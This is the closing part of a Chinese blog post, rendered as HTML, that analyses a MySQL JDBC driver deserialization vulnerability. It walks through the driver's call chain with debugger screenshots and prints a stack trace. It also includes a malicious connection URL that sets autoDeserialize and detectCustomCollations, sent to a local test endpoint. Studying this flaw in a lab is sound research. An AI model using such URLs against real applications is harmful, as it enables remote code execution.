+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.29<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 版本号可以根据需要修改 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>连接语句，可参照上方环境部署</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// url为可自定义地址</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password); </span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-代码流程"><a href="#0x02-代码流程" class="headerlink" title="0x02 代码流程"></a>0x02 代码流程</h3><ul>
+<li>自定义jdbc连接，查看执行流程<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/root?detectCustomCollations=true%26autoDeserialize=true%26user=root&amp;password=&amp;password=root1234</span><br></pre></td></tr></table></figure>
+<img src="/images/Pasted%20image%2020240802052209.png"></li>
+</ul>
+<p>请求连接：<a target="_blank" rel="noopener" href="http://localhost:8776/jdbctest?exp=jdbc:mysql://127.0.0.1:3306/root?detectCustomCollations=true&autoDeserialize=true&user=root&password=&password=root1234">http://localhost:8776/jdbctest?exp=jdbc:mysql://127.0.0.1:3306/root?detectCustomCollations=true%26autoDeserialize=true%26user=root&amp;password=&amp;password=root1234</a></p>
+<p>跟进getConnection方法：java.sql.DriverManager#getConnection(java.lang.String, java.lang.String, java.lang.String)<br><img src="/images/Pasted%20image%2020240802053309.png"></p>
+<p>接着调用getConnection：<code>java.sql.DriverManager#getConnection(java.lang.String, java.util.Properties, java.lang.Class&lt;?&gt;)</code><br><img src="/images/Pasted%20image%2020240802053523.png"></p>
+<p>向下走，调用到<code>java.sql.Driver#connect</code>，跟进去<br><img src="/images/Pasted%20image%2020240802053625.png"></p>
+<p>进入到：<code>com.mysql.jdbc.NonRegisteringDriver#connect</code><br><img src="/images/Pasted%20image%2020240802053702.png"></p>
+<p>如果url不为空，则进入第一个if语句，并且url以<code>jdbc:mysql:loadbalance://</code>或以<code>jdbc:mysql:replication://</code>开头则进入<code>com.mysql.jdbc.NonRegisteringDriver#connectLoadBalanced</code>或<code>com.mysql.jdbc.NonRegisteringDriver#connectReplicationConnection</code><br>显然此处都不符合：<br><img src="/images/Pasted%20image%2020240802054306.png"></p>
+<p>接着又来几个if，不需要管，向下走，跟进入<code>com.mysql.jdbc.ConnectionImpl#getInstance</code><br><img src="/images/Pasted%20image%2020240802054733.png"></p>
+<p><code>com.mysql.jdbc.ConnectionImpl#getInstance</code>中调用了<code>com.mysql.jdbc.Util#handleNewInstance</code><br><img src="/images/Pasted%20image%2020240802054927.png"></p>
+<p>ctor反射调用<code>class com.mysql.jdbc.JDBC4Connection</code>并传入args参数<br><img src="/images/Pasted%20image%2020240802055029.png"></p>
+<p><code>com.mysql.jdbc.JDBC4Connection#JDBC4Connection</code>使用<code>super</code>执行父类，也就是<code>com.mysql.jdbc.ConnectionImpl#ConnectionImpl(java.lang.String, int, java.util.Properties, java.lang.String, java.lang.String)</code><br><img src="/images/Pasted%20image%2020240802060251.png"></p>
+<p>向下翻多加几个断点，不必要的地方直接跳过，跳到<code>com.mysql.jdbc.ConnectionImpl#createNewIO</code>步入进去（不要问为什么是这，文章都是这么写的[哭]）<br>进入后我这里调用了<code>com.mysql.jdbc.ConnectionImpl#connectOneTryOnly</code><br><img src="/images/Pasted%20image%2020240802062931.png"></p>
+<p>向下走调用<code>com.mysql.jdbc.ConnectionImpl#initializePropsFromServer</code>，这个方法解析连接参数中<code>statementInterceptors</code>参数并添加相应类至当前对象<code>statementInterceptors</code>属性<br><img src="/images/Pasted%20image%2020240802063337.png"></p>
+<p>接着<code>com.mysql.jdbc.ConnectionImpl#loadServerVariables</code>在2222行调用了<code>com.mysql.jdbc.ConnectionImpl#loadServerVariables</code><br><img src="/images/Pasted%20image%2020240802071345.png"></p>
+<p>跟进<code>com.mysql.jdbc.ConnectionImpl#loadServerVariables</code><br>程序为query赋值，接下来调用<code>java.sql.Statement#executeQuery</code>并传入query的值<br><img src="/images/Pasted%20image%2020240802071531.png"></p>
+<p><code>com.mysql.jdbc.StatementImpl#executeQuery</code>通过一系列处理，再次调用到<code>com.mysql.jdbc.MySQLConnection#execSQL(com.mysql.jdbc.StatementImpl, java.lang.String, int, com.mysql.jdbc.Buffer, int, int, boolean, java.lang.String, com.mysql.jdbc.Field[])</code><br><img src="/images/Pasted%20image%2020240802071731.png"></p>
+<p>继续看<code>execSQL</code>，又调用了<code>com.mysql.jdbc.ConnectionImpl#execSQL(com.mysql.jdbc.StatementImpl, java.lang.String, int, com.mysql.jdbc.Buffer, int, int, boolean, java.lang.String, com.mysql.jdbc.Field[], boolean)</code><br><img src="/images/Pasted%20image%2020240802071832.png"></p>
+<p><code>execSQL</code>方法中再次调用<code>com.mysql.jdbc.MysqlIO#sqlQueryDirect</code>并传入值（如图）<br><img src="/images/Pasted%20image%2020240802071946.png"></p>
+<p>1750行：执行sql语句<code>SHOW SESSION STATUS</code>获取返回内容<br><img src="/images/Pasted%20image%2020240802072935.png"></p>
+<p>1915行：调用<code>com.mysql.jdbc.StatementInterceptorV2#preProcess</code>代码进入<code>com.mysql.jdbc.NoSubInterceptorWrapper#preProcess</code>接着再调用<code>com.mysql.jdbc.StatementInterceptor#preProcess</code><br><img src="/images/Pasted%20image%2020240802074509.png"></p>
+<p>进入<code>com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</code>调用<code>com.mysql.jdbc.Util#resultSetToMap(java.util.Map, java.sql.ResultSet)</code><br><img src="/images/Pasted%20image%2020240802074627.png"></p>
+<p>接下来就是<code>getObject</code>开始反序列化了<br><img src="/images/Pasted%20image%2020240802074751.png"></p>
+<p>跟进getObject，搜索readObject下断点，实际上此处<code>objIn</code>就是我们伪造的数据库给出的数据了。<br><img src="/images/Pasted%20image%2020240802075018.png"></p>
+<p>步过触发反序列化造成RCE<br><img src="/images/Pasted%20image%2020240802075106.png"></p>
+<p>大致流程如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">getObject:5017, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">resultSetToMap:500, Util (com.mysql.jdbc)</span><br><span class="line">populateMapWithSessionStatusValues:75, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:92, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:58, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">preProcess:71, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPre:3007, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:2671, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:2828, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:2777, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:1651, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:4215, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:3609, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:2550, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:2320, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:834, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:46, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:423, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:411, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:416, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:347, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:664, DriverManager (java.sql)</span><br><span class="line">getConnection:247, DriverManager (java.sql)</span><br><span class="line">getDataFromRemoteDB:19, jdbcController (com.example.jdbcspring.controller)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor">https://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor</a></li>
+<li><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/parttime/index.html">PartTime</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tools"><span class="toc-number">1.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">环境部署</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%89%88%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">获取目标版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Payload%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">修改Payload直接执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips-%E6%9C%AA%E7%9F%A5Gadget%E5%88%A9%E7%94%A8DNSLOG%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">Tips: 未知Gadget利用DNSLOG进行探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Jdbc"><span class="toc-number">4.1.</span> <span class="toc-text">What is Jdbc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E9%93%BE"><span class="toc-number">4.3.</span> <span class="toc-text">JDBC反序列化入口链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#detectCustomCollations%E9%93%BE"><span class="toc-number">4.3.1.</span> <span class="toc-text">detectCustomCollations链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerStatusDiffInterceptor%E9%93%BE"><span class="toc-number">4.3.2.</span> <span class="toc-text">ServerStatusDiffInterceptor链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">4.4.</span> <span class="toc-text">利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.4.1.</span> <span class="toc-text">0x01 环境介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">4.4.2.</span> <span class="toc-text">0x02 代码流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&text=JDBC反序列化分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&is_video=false&description=JDBC反序列化分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JDBC反序列化分析&body=Check out this article: http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&name=JDBC反序列化分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&t=JDBC反序列化分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    z1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
